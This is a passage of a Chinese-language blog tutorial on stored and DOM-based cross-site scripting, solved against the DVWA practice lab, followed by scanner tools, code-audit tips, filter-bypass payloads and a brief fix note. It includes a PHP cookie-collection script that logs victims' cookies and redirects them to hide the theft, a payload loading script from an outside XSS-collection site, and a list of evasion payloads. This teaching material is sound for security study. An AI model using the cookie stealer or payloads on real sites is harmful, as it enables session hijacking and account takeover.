<h4 id="存储型-1"><a href="#存储型-1" class="headerlink" title="存储型"></a>存储型</h4><p>存储型XSS  是指应用程序通过Web请求获取不可信赖的数据，在未检验数据是否存在XSS代码的情况下，便将其存入数据库。当下一次从数据库中获取该数据时程序也未对其进行过滤，页面再次执行XSS代码，存储型XSS可以持续攻击用户。存储型XSS漏洞大多出现在留言板、评论区，用户提交了包含XSS代码的留言到数据库。当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来。浏览器发现有XSS代码，就当做正常的HTML和JS解析执行，存储型XSS就发生了。</p>
<p>存储型XSS攻击方式主要是嵌入一段远程或者第三方域上的JS代码，并在目标域执行这些代码。存储型XSS会造成Cookie泄露，破坏页面正常的结构与样式，重定向访问恶意网站等。</p>
<h5 id="搭建接收平台"><a href="#搭建接收平台" class="headerlink" title="搭建接收平台"></a>搭建接收平台</h5><p>参考下面的<code>cookie.php</code>文件获取网站cookie方式；保存单文件至当前文件夹内；也可以使用互联网上的接收平台<a target="_blank" rel="noopener" href="https://webxss.top/">XSS_Top</a></p>
<h5 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h5><h6 id="DVWA-low"><a href="#DVWA-low" class="headerlink" title="DVWA-low"></a>DVWA-low</h6><p>看到输入框长度有限制，这里可以通过修改JS，或者使用Burpsuite来实现。</p>
<p><img src="/images/XSS/image-20200831171126727.png" alt="image-20200831171126727"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">DVWA-Low</span><br><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;</span><br><span class="line">	&#x2F;&#x2F; Get input</span><br><span class="line">	$message &#x3D; trim( $_POST[ &#39;mtxMessage&#39; ] );</span><br><span class="line">	$name    &#x3D; trim( $_POST[ &#39;txtName&#39; ] );</span><br><span class="line">	&#x2F;&#x2F; Sanitize message input</span><br><span class="line">	$message &#x3D; stripslashes( $message );</span><br><span class="line">	$message &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Sanitize name input</span><br><span class="line">	$name &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Update database</span><br><span class="line">	$query  &#x3D; &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;</span><br><span class="line">	$result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res &#x3D; mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;&#x2F;pre&gt;&#39; );</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>截获数据并修改Message的值</p>
<p><img src="/images/XSS/image-20200831171424381.png" alt="image-20200831171424381"></p>
<p>接收平台此时会收到Cookie值</p>
<p><img src="/images/XSS/image-20200831171401476.png" alt="image-20200831171401476"></p>
<p>浏览器插件添加Cookie值并绕过登录</p>
<p><img src="/images/XSS/image-20200831173056272.png" alt="image-20200831173056272"></p>
<p>接收Cookie的php文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$cookie &#x3D; $_GET[&#39;cookie&#39;]; &#x2F;&#x2F;以GET方式获取cookie变量值</span><br><span class="line">$ip &#x3D; getenv (&#39;REMOTE_ADDR&#39;); &#x2F;&#x2F;远程主机IP地址</span><br><span class="line">$time&#x3D;date(&#39;Y-m-d g:i:s&#39;); &#x2F;&#x2F;以“年-月-日 时：分：秒”的格式显示时间</span><br><span class="line">$referer&#x3D;getenv (&#39;HTTP_REFERER&#39;); &#x2F;&#x2F;链接来源</span><br><span class="line">$agent &#x3D; $_SERVER[&#39;HTTP_USER_AGENT&#39;]; &#x2F;&#x2F;用户浏览器类型</span><br><span class="line"></span><br><span class="line">$fp &#x3D; fopen(&#39;cookie.txt&#39;, &#39;a&#39;); &#x2F;&#x2F;打开cookie.txt，若不存在则创建它</span><br><span class="line">fwrite($fp,&quot; IP: &quot; .$ip. &quot;\n Date and Time: &quot; .$time. &quot;\n User Agent:&quot;.$agent.&quot;\n Referer: &quot;.$referer.&quot;\n Cookie: &quot;.$cookie.&quot;\n\n\n&quot;); &#x2F;&#x2F;写入文件</span><br><span class="line">fclose($fp); &#x2F;&#x2F;关闭文件</span><br><span class="line"></span><br><span class="line">header(&quot;Location: http:&#x2F;&#x2F;www.baidu.com&quot;)&#x2F;&#x2F;重定向到baidu，防止发现</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>直接访问生成cookie.txt文件</p>
<p><img src="/images/XSS/image-20200831183628978.png" alt="image-20200831183628978"></p>
<h6 id="DVWA-Medium"><a href="#DVWA-Medium" class="headerlink" title="DVWA-Medium"></a>DVWA-Medium</h6><p>中级和低级比较显示使用部分函数进行过滤。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">addslashes()				使用反斜线引用字符串</span><br><span class="line">htmlspecialchars()	将特殊字符转换为 HTML 实体</span><br><span class="line">str_replace()				子字符串替换</span><br></pre></td></tr></table></figure>

<p><img src="/images/XSS/image-20200901112252053.png" alt="image-20200901112252053"></p>
<p>抓包绕过</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">`&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;`</span><br><span class="line">大小写绕过</span><br><span class="line">`&lt;Script&gt;alert(/xss/)&lt;/script&gt;`</span><br><span class="line">`&lt;/textarea&gt;&#x27;&quot;&gt;&lt;Script src=https://webxss.top/xss/BjE4XZ?1598931992&gt;&lt;/script&gt;`</span><br></pre></td></tr></table></figure>

<p>弹窗检测</p>
<p><img src="/images/XSS/image-20200901134156567.png" alt="image-20200901134156567"></p>
<p><img src="/images/XSS/image-20200901134205736.png" alt="image-20200901134205736"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&lt;img src=1 οnerrοr=alert(1)&gt;`</span><br></pre></td></tr></table></figure>

<h6 id="DVWA-high"><a href="#DVWA-high" class="headerlink" title="DVWA-high"></a>DVWA-high</h6><p>高和中比较发现采用正则表达式对script进行过滤了；但可尝试使用其他标签<img>等</p>
<p><img src="/images/XSS/image-20200901135011353.png" alt="image-20200901135011353"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>`</span><br></pre></td></tr></table></figure>

<p><img src="/images/XSS/image-20200901140548264.png" alt="image-20200901140548264"></p>
<p><img src="/images/XSS/image-20200901140610422.png" alt="image-20200901140610422"></p>
<h4 id="DOM型-2"><a href="#DOM型-2" class="headerlink" title="DOM型"></a>DOM型</h4><h5 id="DVWA-low-1"><a href="#DVWA-low-1" class="headerlink" title="DVWA-low"></a>DVWA-low</h5><p>low版本不存在任何显示，default参数值设置为payload。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># No protections, anything goes</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/XSS/image-20200901142115894.png" alt="image-20200901142115894"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">`&lt;option value=&quot;%3Cscript%3Ealert(%27xss%27)%3C/script%3E&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;/option&gt;`</span><br><span class="line"><span class="meta">#</span><span class="bash"> script标签及值放在option标签内&lt;dom树执行结果&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="DVWA-Medium-1"><a href="#DVWA-Medium-1" class="headerlink" title="DVWA-Medium"></a>DVWA-Medium</h5><p>中级出现了对值&lt;script进行判断</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Is there any input?</span><br><span class="line">if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) &#123;</span><br><span class="line">	$default &#x3D; $_GET[&#39;default&#39;];</span><br><span class="line">	</span><br><span class="line">	# Do not allow script tags</span><br><span class="line">	if (stripos ($default, &quot;&lt;script&quot;) !&#x3D;&#x3D; false) &#123;</span><br><span class="line">		header (&quot;location: ?default&#x3D;English&quot;);</span><br><span class="line">		exit;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 此时使用`&lt;img src=1 onerror=alert(1)&gt;`</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如下图所示，发现我们的语句被插入到了value值中，并没有插入到option标签的值中，所以img标签并没有发起任何作用。</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/XSS/image-20200901145238002.png" alt="image-20200901145238002"></p>
<p>构造语句闭合option标签：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&gt;&lt;/option&gt;&lt;img src=1 onerror=alert(1)&gt;`</span><br></pre></td></tr></table></figure>

<p><img src="/images/XSS/image-20200901145626304.png" alt="image-20200901145626304"></p>
<p>&gt; 被插入到了option标签的值中，因为</option>闭合了option标签，所以img标签并没有插入;构造语句去闭合select标签</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 完成标签闭合完成</span></span><br><span class="line">`&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(&#x27;xss&#x27;)&gt;`</span><br></pre></td></tr></table></figure>

<p><img src="/images/XSS/image-20200901145826892.png" alt="image-20200901145826892"></p>
<h5 id="DVWA-High"><a href="#DVWA-High" class="headerlink" title="DVWA-High"></a>DVWA-High</h5><p>先判断defalut值是否为空，如果不为空的话，再用switch语句进行匹配，如果匹配成功，则插入case字段的相应值，如果不匹配，则插入的是默认的值。这样的话，语句就没有可能插入到页面中了。</p>
<h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><h4 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h4><h5 id="AWVS"><a href="#AWVS" class="headerlink" title="AWVS"></a>AWVS</h5><p><img src="/images/XSS/image-20200831112823669.png" alt="image-20200831112823669"></p>
<p>一款自动化扫描工具，主要利用爬虫形式对整个网站进行爬取后再进行内部payload测试。这样就可以检测网站是否存在XSS漏洞等。</p>
<p>目前最新版本已经AWVS 13支持Web端配置如上图所示</p>
<h5 id="BruteXSS"><a href="#BruteXSS" class="headerlink" title="BruteXSS"></a>BruteXSS</h5><p><a target="_blank" rel="noopener" href="https://github.com/rajeshmajumdar/BruteXSS.git">项目地址</a></p>
<p><img src="/images/XSS/image-20200831111313145.png" alt="image-20200831111313145"></p>
<p>BruteXSS 是一个非常强大和快速的跨站点脚本检测工具，可用于暴力注入参数。BruteXSS 从指定的词库加载多种有效载荷进行注入，并且使用指定的载荷和扫描检查这些存在 XSS 漏洞的参数。得益于非常强大的扫描功能，在执行任务时，BruteXSS 非常准确而且极少误报。 BruteXSS 支持 POST 和 GET 请求，并适应现代 Web 应用程序。</p>
<p><strong>特点</strong></p>
<ol>
<li>XSS 爆破</li>
<li>XSS 扫描</li>
<li>GET/POST 请求</li>
<li>可包含自定义单词</li>
<li>人性化的 UI</li>
</ol>
<p>其它工具自行搜索，不过基于以上工具可基本满足平时测试和复现；其他工具网络搜索即可。</p>
<h5 id="BeEF"><a href="#BeEF" class="headerlink" title="BeEF"></a>BeEF</h5><p>BeEF，全称The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具。</p>
<p><img src="/images/XSS/logo.png" alt="logo"></p>
<p>参考另一篇BeEF使用。</p>
<h4 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h4><p>关于XSS的代码审计主要就是从<code>接收参数</code>和<code>输出函数</code>及一些关键词入手。</p>
<p>PHP中常见<code>接收参数</code>的方式有：<code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code>等等，</p>
<p>PHP中常见<code>输出函数</code>的方式有：<code>print</code>，<code>print_r</code>，<code>echo</code>，<code>printf</code>，<code>sprintf</code>，<code>die</code>，<code>var_dump</code>，<code>var_export</code></p>
<p>可以搜索<code>接收参数</code>的地方。然后对接收到的数据进行跟踪，看看有没有输出到页面中，然后看输出到页面中的数据是否进行了过滤和html编码等处理。</p>
<p>也可以搜索<code>输出函数</code>这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取的，是否能控制存到数据库中的数据，存到数据库之前有没有进行过滤等等。</p>
<p>大多数程序会对接收参数封装在公共文件的函数中统一调用，就需要审计这些公共函数看有没有过滤，能否绕过等等。</p>
<p>DOM型注入同样可以搜索一些JS操作DOM元素的关键词进行审计。</p>
<h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>汇总部分绕过xss过滤方式，更多可搜“<code>XSS Filter Evasion Cheat Sheet_SecPulse</code>”一份专门介绍XSS的绕过。</p>
<h4 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&lt;ScRIpT&gt;alert(&#x27;XSS&#x27;)&lt;/sCRIpT&gt;`</span><br></pre></td></tr></table></figure>

<h4 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、十六进制编码</span><br><span class="line">2、jsfuck编码</span><br><span class="line">3、url编码</span><br><span class="line">4、unicode编码等</span><br><span class="line">5、`&lt;0x736372697074&gt;alert(&#x27;123&#x27;)&lt;/0x736372697074&gt;`</span><br><span class="line">6、`&lt;img src=&quot;1&quot; onerror=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt;`</span><br></pre></td></tr></table></figure>

<h4 id="magic-quotes-gpc"><a href="#magic-quotes-gpc" class="headerlink" title="magic_quotes_gpc"></a>magic_quotes_gpc</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//绕过可参考以下</span><br><span class="line">`&lt;script&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>

<h4 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h4><h5 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//查看源码输出位置是否存在标签未闭合情况来进行绕过</span><br><span class="line">`&quot;&gt;&lt;script&gt;alert(/123/)&lt;/script&gt;`</span><br><span class="line">`&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>

<h5 id="其它标签"><a href="#其它标签" class="headerlink" title="其它标签"></a>其它标签</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//使用较多方式是通过报错形式来添加标签进行绕过</span><br><span class="line">`&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;`</span><br><span class="line">`&lt;button onclick=&quot;javascript:alert(&#x27;XSS&#x27;)&gt;XSS&lt;/button&quot;&gt;`</span><br><span class="line">`&lt;title&gt;&lt;img a=&quot;&lt;/title&gt;&lt;img/src=1 onerror=alert(1)//&quot;&gt;`</span><br><span class="line">`&quot;onsubmit=javascript:alert(1)%20name=&quot;a`</span><br><span class="line">`&lt;details open ontoggle=&quot;eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))&quot;&gt;`</span><br><span class="line">`&lt;video src=&quot;http://www.0dutv.com/plug/down/up2.php/104678898.mp3&quot; onprogress=(&#x27;body&#x27;).perpend(123);(&#x27;body&#x27;)&gt;&lt;/video&gt;`</span><br></pre></td></tr></table></figure>

<h4 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h4><table>
<thead>
<tr>
<th>符号</th>
<th>替换</th>
</tr>
</thead>
<tbody><tr>
<td>%0a</td>
<td>替换空格</td>
</tr>
<tr>
<td>%d</td>
<td>替换空格</td>
</tr>
<tr>
<td>/**/</td>
<td>替换空格</td>
</tr>
<tr>
<td>%00</td>
<td>截断</td>
</tr>
<tr>
<td>``</td>
<td>替换括号</td>
</tr>
</tbody></table>
<h4 id="重复绕过"><a href="#重复绕过" class="headerlink" title="重复绕过"></a>重复绕过</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//对部分字符过滤及替换时，采用重复形式进行绕过</span><br><span class="line">`&lt;img ononerrorerror=&quot;123&quot;&gt;`</span><br><span class="line">`&lt;script&gt;alalertert(123)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>

<h4 id="宽子节绕过"><a href="#宽子节绕过" class="headerlink" title="宽子节绕过"></a>宽子节绕过</h4><p><code>GB系列</code>编码，尝试宽字节字符：</p>
<p> <code>%c0</code>、<code>%bf</code>、<code>%5c</code>、<code>%df</code></p>
<h4 id="事件属性"><a href="#事件属性" class="headerlink" title="事件属性"></a>事件属性</h4><table>
<thead>
<tr>
<th>属性</th>
<th>解析</th>
</tr>
</thead>
<tbody><tr>
<td>onclick</td>
<td>鼠标点击事件</td>
</tr>
<tr>
<td>onerror</td>
<td>当加载文档或图像时发生某个错误</td>
</tr>
<tr>
<td>onload</td>
<td>某个页面或图像被完成加载</td>
</tr>
<tr>
<td>onmousemove</td>
<td>鼠标被移动</td>
</tr>
<tr>
<td>等其它事件</td>
<td></td>
</tr>
</tbody></table>
<h4 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h4><p>input标签中有maxlength限制传参长度，抓包修改发送数据。</p>
<h4 id="PHP部分函数"><a href="#PHP部分函数" class="headerlink" title="PHP部分函数"></a>PHP部分函数</h4><p>php内包含部分过滤及转义函数及绕过方式统计</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>PHP函数</th>
<th>函数解析</th>
<th>绕过</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>str_replace()</td>
<td>该函数区分大小写</td>
<td>使用大小写进行绕过</td>
</tr>
<tr>
<td>2</td>
<td>str_ireplace()</td>
<td>该函数不区分大小写</td>
<td>双写绕过，如：<scscriptirpt></td>
</tr>
<tr>
<td>3</td>
<td>preg_replace()</td>
<td>正则表达式的搜索和替换</td>
<td>使用html标签事件绕过，如：<code>&lt;img src=xx onerror=alert(1)&gt;</code></td>
</tr>
<tr>
<td>4</td>
<td>htmlentities()</td>
<td>将字符转换为 HTML 转义字符</td>
<td>htmlentities(string,quotestyle,character-set)函数的参数二，<br />默认情况下，是不对单引号进行编码的，仍可以用事件来触发XSS</td>
</tr>
</tbody></table>
<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>不管是反射型、存储型还是DOM型XSS可对外部提交的参数进行过滤及转义操作将达到简单防护功效；</p>
<center>学习～</center>
### 参考

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//反射型挑战解析</span><br><span class="line">https://my.oschina.net/u/4332632/blog/3374751</span><br><span class="line">https://www.cnblogs.com/bmjoker/p/9446472.html</span><br><span class="line">bypass姿势</span><br><span class="line">https://owasp.org/www-community/xss-filter-evasion-cheatsheet</span><br><span class="line">https://xz.aliyun.com/t/1678/</span><br></pre></td></tr></table></figure>
</section>
    <!-- Tags START -->
    
      <div class="tags">
        <span>Tags:</span>
        
  <a href="/tags#XSS" >
    <span class="tag-code">XSS</span>
  </a>

      </div>
    
    <!-- Tags END -->
    <!-- NAV START -->
    
  <div class="nav-container">
    <!-- reverse left and right to put prev and next in a more logic postition -->
    
      <a class="nav-left" href="/2020/08/28/Shiro%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
        <span class="nav-arrow">← </span>
        
          Shiro漏洞学习
        
      </a>
    
    
      <a class="nav-right" href="/2020/09/11/Webshell%E6%A3%80%E6%B5%8B/">
        
          Webshell检测
        
        <span class="nav-arrow"> →</span>
      </a>
    
  </div>

    <!-- NAV END -->
    <!-- 打赏 START -->
    
      <div class="money-like">
        <div class="reward-btn">
          赏
          <span class="money-code">
            <span class="alipay-code">
              <div class="code-image"></div>
              <b>使用支付宝打赏</b>
            </span>
            <span class="wechat-code">
              <div class="code-image"></div>
              <b>使用微信打赏</b>
            </span>
          </span>
        </div>
        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
      </div>
    
    <!-- 打赏 END -->
    <!-- 二维码 START -->
    
      <div class="qrcode">
        <canvas id="share-qrcode"></canvas>
        <p class="notice">扫描二维码，分享此文章</p>
      </div>
    
    <!-- 二维码 END -->
    
      <!-- Gitment START -->
      <div id="comments"></div>
      <!-- Gitment END -->
    
  </article>
  <!-- Article END -->
  <!-- Catalog START -->
  
    <aside class="catalog-container">
  <div class="toc-main">
    <strong class="toc-title">Catalog</strong>
    
      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">漏洞概述</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">原理</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E4%BA%A7%E7%94%9F%E8%BF%87%E7%A8%8B"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">产生过程</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B-%E9%9D%9E%E6%8C%81%E4%B9%85%E6%80%A7"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">反射型(非持久性)</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B-%E6%8C%81%E4%B9%85%E6%80%A7"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">存储型(持久性)</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#DOM%E5%9E%8B"><span class="toc-nav-number">1.2.3.</span> <span class="toc-nav-text">DOM型</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">漏洞分类</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E4%B8%80%E3%80%81%E9%9D%9E%E6%8C%81%E4%B9%85%E5%9E%8B-%E5%8F%8D%E5%B0%84%E5%9E%8B%E3%80%81DOM%E5%9E%8B"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">一、非持久型(反射型、DOM型)</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E4%BA%8C%E3%80%81%E6%8C%81%E4%B9%85%E5%9E%8B-%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="toc-nav-number">1.3.2.</span> <span class="toc-nav-text">二、持久型(存储型)</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">漏洞环境</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%9C%A8%E7%BA%BF%E6%8C%91%E6%88%98"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">在线挑战</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">影响范围</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-nav-number">4.1.</span> <span class="toc-nav-text">反射型</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="toc-nav-number">4.2.</span> <span class="toc-nav-text">存储型</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#DOM%E5%9E%8B-1"><span class="toc-nav-number">4.3.</span> <span class="toc-nav-text">DOM型</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%AE%9E%E6%88%98%E9%AA%8C%E8%AF%81"><span class="toc-nav-number">5.</span> <span class="toc-nav-text">实战验证</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B-1"><span class="toc-nav-number">5.1.</span> <span class="toc-nav-text">反射型</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%8C%91%E6%88%98%E4%B8%80"><span class="toc-nav-number">5.1.1.</span> <span class="toc-nav-text">挑战一</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%8C%91%E6%88%98%E4%BA%8C"><span class="toc-nav-number">5.1.2.</span> <span class="toc-nav-text">挑战二</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%8C%91%E6%88%98%E4%B8%89"><span class="toc-nav-number">5.1.3.</span> <span class="toc-nav-text">挑战三</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%8C%91%E6%88%98%E5%9B%9B"><span class="toc-nav-number">5.1.4.</span> <span class="toc-nav-text">挑战四</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%8C%91%E6%88%98%E4%BA%94"><span 